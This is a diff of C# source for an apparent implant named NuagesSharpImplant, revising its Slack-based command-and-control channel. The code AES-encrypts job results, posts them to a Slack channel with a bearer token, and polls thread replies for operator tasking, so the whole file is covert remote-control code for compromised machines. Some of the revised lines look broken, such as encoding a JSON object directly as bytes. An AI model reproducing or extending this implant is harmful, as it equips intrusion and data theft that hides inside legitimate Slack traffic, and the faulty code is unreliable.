@@ -1,14 +1,10 @@
 using System;
-using System.Collections.Generic;
 using System.IO;
 using System.Net;
-using Newtonsoft.Json.Linq;
 using System.Security.Cryptography;
 using System.Text;
-using System.Net.Http;
-using Newtonsoft.Json;
-using System.CodeDom;
-using System.Linq;
+using System.Json;
+using System.Collections.Generic;
 
 namespace NuagesSharpImplant
 {
@@ -23,7 +19,7 @@ namespace NuagesSharpImplant
 
         private string slackToken;
 
-        private HttpClient client;
+        private  WebClient client;
 
         private string channelId;
 
@@ -47,9 +43,9 @@ namespace NuagesSharpImplant
 
             this.channelId = channelId;
             
-            this.client = new HttpClient();
+            this.client = new WebClient();
 
-            this.client.BaseAddress = new Uri("https://slack.com/api/");
+           //this.client.BaseAddress = new Uri("https://slack.com/api/");
         }
 
         public string getConnectionString()
@@ -88,16 +84,16 @@ namespace NuagesSharpImplant
 
         string sendSlackMessage(string message, int tries = 0)
         {
-            JObject body = new JObject(
-                new JProperty("channel", this.channelId),
-                new JProperty("text", message),
-                new JProperty("as_user", true)
-            );
+            List<KeyValuePair<string, JsonValue>> list = new List<KeyValuePair<string, JsonValue>>();
+            list.Add(new KeyValuePair<string, JsonValue>("channel", this.channelId));
+            list.Add(new KeyValuePair<string, JsonValue>("text", message));
+            list.Add(new KeyValuePair<string, JsonValue>("as_user", true));
+            JsonObject body = new JsonObject(list);
             WebRequest request = WebRequest.Create("https://slack.com/api/chat.postMessage");
             request.Headers.Add("Authorization", "Bearer " + this.slackToken);
             request.ContentType = "application/json";
             request.Method = "POST";
-            byte[] byteArray = Encoding.UTF8.GetBytes(body.ToString(Formatting.None));
+            byte[] byteArray = Encoding.UTF8.GetBytes(body);
             request.ContentLength = byteArray.Length;
             Stream dataStream = request.GetRequestStream();
             dataStream.Write(byteArray, 0, byteArray.Length);
@@ -111,9 +107,9 @@ namespace NuagesSharpImplant
             dataStream = response.GetResponseStream();
             StreamReader reader = new StreamReader(dataStream);
             string responseFromServer = reader.ReadToEnd();
-            JObject jResponse = JObject.Parse(responseFromServer);
+            JsonValue jResponse = JsonValue.Parse(responseFromServer);
             if ((int)response.StatusCode != 200 || (bool)jResponse["ok"] != true)
-            {
+             {
                 throw new Exception("Couldnt send SLACK message");
             }
             string ts = jResponse["ts"].ToString();
@@ -141,8 +137,8 @@ namespace NuagesSharpImplant
             dataStream = response.GetResponseStream();
             StreamReader reader = new StreamReader(dataStream);
             string responseFromServer = reader.ReadToEnd();
-            JObject jResponse = JObject.Parse(responseFromServer);
-            JArray messages = (JArray)(jResponse["messages"]);
+            JsonValue jResponse = JsonValue.Parse(responseFromServer);
+            JsonValue messages = jResponse["messages"];
             if (messages.Count < 2) {
                 System.Threading.Thread.Sleep(1000 * (tries + 1));
                 return getSlackResponse(ts, tries + 1);
@@ -150,16 +146,13 @@ namespace NuagesSharpImplant
             return messages[1]["text"].ToString();
         }
 
-
-
-
         public string POST(string url, string jsonContent)
         {
 
-            JObject body = new JObject(
-                new JProperty("url", url),
-                new JProperty("body", Convert.ToBase64String(this.aes.EncryptString(jsonContent)))
-            );
+            List<KeyValuePair<string, JsonValue>> list = new List<KeyValuePair<string, JsonValue>>();
+            list.Add(new KeyValuePair<string, JsonValue>("url", url));
+            list.Add(new KeyValuePair<string, JsonValue>("body", Convert.ToBase64String(this.aes.EncryptString(jsonContent))));
+            JsonObject body = new JsonObject(list);
             string ts = sendSlackMessage(body.ToString());
             if (url == "jobresult") {
                 return "";
@@ -190,46 +183,61 @@ namespace NuagesSharpImplant
 
             public byte[] EncryptString(string message)
             {
-                var aes = new AesCryptoServiceProvider();
-                aes.Mode = CipherMode.CBC;
-                aes.KeySize = 256;
-                aes.Padding = PaddingMode.PKCS7;
-                byte[] iv = aes.IV;
-                using (var memStream = new System.IO.MemoryStream())
+                byte[] encrypted;
+                using (Rijndael rijAlg = Rijndael.Create())
                 {
-                    memStream.Write(iv, 0, iv.Length);
-                    using (var cryptStream = new CryptoStream(memStream, aes.CreateEncryptor(this.key, aes.IV), CryptoStreamMode.Write))
+                    rijAlg.Key = key;
+                    rijAlg.GenerateIV();
+                    rijAlg.Mode = CipherMode.CBC;
+                    rijAlg.Padding = PaddingMode.PKCS7;
+                    byte[] iv = rijAlg.IV;
+                    ICryptoTransform encryptor = rijAlg.CreateEncryptor(rijAlg.Key, rijAlg.IV);
+                    using (MemoryStream msEncrypt = new MemoryStream())
                     {
-                        using (var writer = new System.IO.StreamWriter(cryptStream))
+                        msEncrypt.Write(iv, 0, iv.Length);
+                        using (CryptoStream csEncrypt = new CryptoStream(msEncrypt, encryptor, CryptoStreamMode.Write))
                         {
-                            writer.Write(message);
+                            using (StreamWriter swEncrypt = new StreamWriter(csEncrypt))
+                            {
+                                swEncrypt.Write(message);
+                                swEncrypt.Flush();
+                            }
+                            encrypted = msEncrypt.ToArray();
                         }
                     }
-                    var buf = memStream.ToArray();
-                    return buf;
                 }
+                return encrypted;
             }
+
 
             public string DecryptString(byte[] bytes)
             {
-                //var bytes = Convert.FromBase64String(encryptedValue);
-                var aes = new AesCryptoServiceProvider();
-                aes.Mode = CipherMode.CBC;
-                aes.Padding = PaddingMode.PKCS7;
-                aes.KeySize = 256;
-                using (var memStream = new System.IO.MemoryStream(bytes))
+                string plaintext = null;
+                using (Rijndael rijAlg = Rijndael.Create())
                 {
-                    var iv = new byte[16];
-                    memStream.Read(iv, 0, 16);
-                    using (var cryptStream = new CryptoStream(memStream, aes.CreateDecryptor(this.key, iv), CryptoStreamMode.Read))
+                    rijAlg.Key = key;
+                    rijAlg.Mode = CipherMode.CBC;
+                    rijAlg.Padding = PaddingMode.PKCS7;
+
+                    using (MemoryStream msDecrypt = new MemoryStream(bytes))
                     {
-                        using (var reader = new System.IO.StreamReader(cryptStream))
+                        var iv = new byte[16];
+                        msDecrypt.Read(iv, 0, 16);
+                        rijAlg.IV = iv;
+                        ICryptoTransform decryptor = rijAlg.CreateDecryptor(rijAlg.Key, rijAlg.IV);
+
+                        using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                         {
-                            return reader.ReadToEnd();
+                            using (StreamReader srDecrypt = new StreamReader(csDecrypt))
+                            {
+                                plaintext = srDecrypt.ReadToEnd();
+                            }
                         }
                     }
                 }
+                return plaintext;
             }
         }
     }
 }
+
